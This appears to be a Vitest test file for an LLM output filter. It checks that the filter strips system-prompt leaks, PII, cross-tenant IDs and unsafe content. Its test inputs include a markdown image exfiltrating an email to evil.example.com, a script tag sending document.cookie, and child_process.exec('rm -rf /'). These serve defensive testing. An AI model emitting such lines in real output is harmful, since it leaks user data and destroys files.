/**
 * Tests for the output filter (LLM02 + LLM05 + LLM07).
 *
 * Covers:
 *   - markdown-image scrub (Rehberger 2023 exfil vector)
 *   - PII redaction via injected port
 *   - system-prompt-leak block
 *   - JS-tag scrub
 *   - code-execution scrub
 *   - cross-tenant ID leak scrub
 */
import { describe, it, expect } from 'vitest';
import {
  createOutputFilter,
  type DataProtectionPort,
} from '../filter/output-filter.js';

const allowed = ['cdn.borjie.com', 'images.borjie.com'];

describe('OutputFilter (LLM02 / LLM05 / LLM07)', () => {
  it('strips markdown image to disallowed domain', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
    });
    const r = f.filter(
      'Here is a chart: ![data](https://evil.example.com/log?d=USER_EMAIL)',
    );
    expect(r.blocks.length).toBeGreaterThan(0);
    expect(r.blocks[0]?.filterRule).toBe('markdown-image-suspicious-domain');
    expect(r.cleaned).toContain('[IMAGE_REMOVED:UNALLOWED_DOMAIN]');
    expect(r.cleaned).not.toContain('evil.example.com');
  });

  it('preserves markdown image to allowed domain', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
    });
    const r = f.filter('Logo: ![logo](https://cdn.borjie.com/logo.png)');
    expect(r.blocks.length).toBe(0);
    expect(r.cleaned).toContain('cdn.borjie.com');
  });

  it('strips system-prompt leak', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
    });
    const r = f.filter(
      'Sure! You are Mr. Mwikila, an AI assistant. Greetings.',
    );
    expect(r.blocks.some((b) => b.filterRule === 'system-prompt-leak')).toBe(
      true,
    );
    expect(r.cleaned).toContain('[SYSTEM_PROMPT_REDACTED]');
  });

  it('strips JS injection tags', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
    });
    const r = f.filter(
      'Hello <script>fetch("/api?d="+document.cookie)</script> world.',
    );
    expect(r.blocks.some((b) => b.filterRule === 'js-injection-tag')).toBe(
      true,
    );
    expect(r.cleaned).not.toContain('<script>');
  });

  it('strips code-execution references', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
    });
    const r = f.filter(
      'You can run child_process.exec("rm -rf /") to clean up.',
    );
    expect(
      r.blocks.some((b) => b.filterRule === 'code-execution-attempt'),
    ).toBe(true);
    expect(r.cleaned).toContain('[CODE_EXEC_REDACTED]');
  });

  it('redacts PII via injected port', () => {
    const dp: DataProtectionPort = {
      redactPii: ({ text }) => ({
        redacted: text.replace(/[\w.-]+@[\w.-]+/g, '[EMAIL_REDACTED]'),
        hits: text.includes('@') ? 1 : 0,
      }),
    };
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
      dataProtection: dp,
    });
    const r = f.filter('Contact: alice@example.com for details.');
    expect(r.blocks.some((b) => b.filterRule === 'pii-redact')).toBe(true);
    expect(r.cleaned).toContain('[EMAIL_REDACTED]');
  });

  it('strips cross-tenant id leak', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
      forbiddenTenantIds: ['tenant-zzz-999'],
    });
    const r = f.filter('Found data for tenant-zzz-999 in the join.');
    expect(r.blocks.some((b) => b.filterRule === 'cross-tenant-id-leak')).toBe(
      true,
    );
    expect(r.cleaned).toContain('[TENANT_ID_REDACTED]');
  });

  it('handles empty input', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
    });
    const r = f.filter('');
    expect(r.cleaned).toBe('');
    expect(r.blocks.length).toBe(0);
  });

  it('handles malformed image URL by removing it', () => {
    const f = createOutputFilter({
      tenantId: 't1',
      channel: 'chat',
      allowedImageDomains: allowed,
    });
    const r = f.filter('See ![x](https://%%%%not-a-url)');
    // URL parser may accept "%%%%not-a-url" as a host, in which case the
    // allowed-list test rejects it as unallowed. Either branch must block.
    expect(r.blocks.length).toBeGreaterThan(0);
    expect(r.cleaned).toContain('[IMAGE_REMOVED');
  });
});
